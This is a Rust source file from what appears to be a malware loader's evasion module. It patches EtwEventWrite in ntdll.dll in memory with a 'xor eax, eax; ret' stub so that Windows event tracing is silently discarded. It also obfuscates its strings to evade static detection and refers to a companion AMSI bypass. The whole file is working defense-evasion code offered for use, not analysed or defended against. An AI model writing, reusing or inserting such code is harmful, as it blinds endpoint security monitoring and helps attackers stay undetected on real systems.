//! bypass/etw.rs — in-process ETW patch
//!
//! Resolves EtwEventWrite inside ntdll.dll (always loaded in every Windows
//! process) and overwrites its prologue with a "xor eax, eax; ret" stub so
//! ETW events are silently discarded instead of forwarded to the event log.
//!
//! Technique identical to the AMSI patch:
//!   1. GetModuleHandleA("ntdll.dll")      — module is always present
//!   2. GetProcAddress(_, "EtwEventWrite") — get function address
//!   3. VirtualProtect -> RWX -> patch -> restore
//!
//! String arguments are stored as obfuscated byte arrays via `obfstr` and
//! decoded on the stack at runtime — no plaintext in .rdata.

use obfstr::obfstr;
use windows_sys::Win32::{
    Foundation::BOOL,
    System::{
        LibraryLoader::{GetModuleHandleA, GetProcAddress},
        Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS},
    },
};

/// Patch EtwEventWrite in the current process.
///
/// Returns `Ok(())` on success, or `Err` with a description string.
/// Failure is non-fatal for the loader.
pub fn patch() -> Result<(), &'static str> {
    // Decode obfuscated strings onto the stack before entering unsafe.
    let dll_name: Vec<u8>  = obfstr!("ntdll.dll\0").bytes().collect();
    let func_name: Vec<u8> = obfstr!("EtwEventWrite\0").bytes().collect();

    unsafe {
        let h_ntdll = GetModuleHandleA(dll_name.as_ptr());
        if h_ntdll == 0 {
            // ntdll is always present — very unexpected
            return Err("GetModuleHandleA(ntdll.dll) returned NULL");
        }

        let proc = GetProcAddress(h_ntdll, func_name.as_ptr());
        let addr = match proc {
            Some(f) => f as *mut u8,
            None    => return Err("EtwEventWrite not found in ntdll"),
        };

        // Make the page writable
        let mut old_protect: PAGE_PROTECTION_FLAGS = 0;
        let ok: BOOL = VirtualProtect(
            addr as *const _,
            8,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        );
        if ok == 0 {
            return Err("VirtualProtect (RWX) failed for ETW patch");
        }

        // xor eax, eax  (33 C0)
        // ret           (C3)
        addr.write(0x33);
        addr.add(1).write(0xC0);
        addr.add(2).write(0xC3);

        // Restore original protection
        let _: BOOL = VirtualProtect(
            addr as *const _,
            8,
            old_protect,
            &mut old_protect,
        );

        Ok(())
    }
}
